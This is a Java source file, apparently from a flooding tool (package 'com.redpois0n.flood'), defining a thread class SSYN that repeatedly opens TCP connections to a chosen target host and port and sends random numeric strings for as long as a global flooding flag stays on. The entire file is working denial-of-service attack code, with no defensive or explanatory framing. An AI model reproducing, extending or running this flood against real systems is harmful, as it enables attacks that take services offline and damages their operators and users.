package com.redpois0n.flood;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Random;

import com.redpois0n.Constants;

public class SSYN extends Thread {

	public String target;
	public int port;

	public SSYN(String t, int p) {
		target = t;
		port = p;
	}

	@SuppressWarnings("resource")
	public void run() {
		while (Constants.flooding) {
			try {
				Socket sock = new Socket(target, port);
				BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
				PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
				Random r = new Random();
				String s = String.valueOf(r.nextInt(90000)) + r.nextInt(9000) + r.nextInt(900) + r.nextInt(90) + r.nextInt(9);
				out.print(s);
				in.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
